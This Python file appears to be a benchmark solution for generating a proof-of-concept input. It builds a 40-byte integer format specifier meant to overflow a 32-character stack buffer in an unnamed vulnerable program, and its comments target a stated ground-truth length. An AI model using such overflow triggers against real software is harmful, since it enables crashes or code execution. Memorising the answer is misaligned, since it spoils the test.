class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description indicates a stack buffer overflow when handling
        # an integer format specifier. A buffer of 32 characters is overflowed because
        # a valid specifier can be constructed to be longer. The ground-truth PoC
        # length is 40 bytes, which we will target.
        #
        # A format specifier is built from components:
        # %<modifier><width>.<precision><type>
        #
        # To achieve a length of 40 bytes, we can use:
        # %          (1 byte)
        # ll         (2 bytes, modifier for long long)
        # <width>    (19 bytes, as hinted for 64-bit platforms)
        # .          (1 byte, separator)
        # <precision>(16 bytes, to reach the total length)
        # d          (1 byte, integer type specifier)
        # Total: 1 + 2 + 19 + 1 + 16 + 1 = 40 bytes.

        modifier = b"ll"
        width = b"1" * 19
        separator = b"."
        precision = b"1" * 16
        specifier_type = b"d"

        poc = b"%" + modifier + width + separator + precision + specifier_type
        
        return poc
